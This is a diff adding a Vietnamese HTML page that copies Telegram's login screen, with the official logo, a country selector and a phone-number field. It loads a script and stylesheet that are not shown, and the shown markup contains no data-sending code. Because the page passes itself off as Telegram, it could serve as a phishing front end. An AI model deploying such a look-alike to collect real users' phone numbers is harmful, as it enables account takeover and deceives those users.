@@ -1,0 +1,58 @@
+<!doctype html>
+<html lang="vi">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Đăng nhập Telegram</title>
+    <link rel="stylesheet" href="style1.css" />
+</head>
+
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" />
+        </div>
+        <h1>Telegram</h1>
+        <p class="subtitle">
+            Vui lòng xác nhận mã quốc gia và <br /> nhập số điện thoại của bạn.
+        </p>
+
+        <form id="login-form">
+            <div class="input-group">
+                <label for="country">Quốc gia</label>
+                <select id="country">
+            <option value="vn">Việt Nam</option>
+            <option value="us">Hoa Kỳ</option>
+            <option value="uk">Vương Quốc Anh</option>
+          </select>
+            </div>
+
+            <div class="input-group">
+                <label for="login-phone">Số điện thoại</label>
+                <div class="phone-input-container">
+                    <span class="prefix">+84</span>
+                    <input type="tel" id="login-phone" placeholder="000 000 000" required />
+                </div>
+            </div>
+
+            <div class="checkbox-group">
+                <input type="checkbox" id="keep-signed-in" checked />
+                <label for="keep-signed-in">Duy trì đăng nhập</label>
+            </div>
+
+            <button type="submit" class="btn-primary">TIẾP THEO</button>
+            <button type="button" class="btn-secondary">
+          ĐĂNG NHẬP BẰNG MÃ QR
+        </button>
+
+            <div class="bottom-link">
+                <a href="register.html" class="text-link">Chưa có tài khoản? Đăng ký ngay</a
+          >
+        </div>
+      </form>
+    </div>
+
+    <script src="script1.js"></script>
+  </body>
+</html>
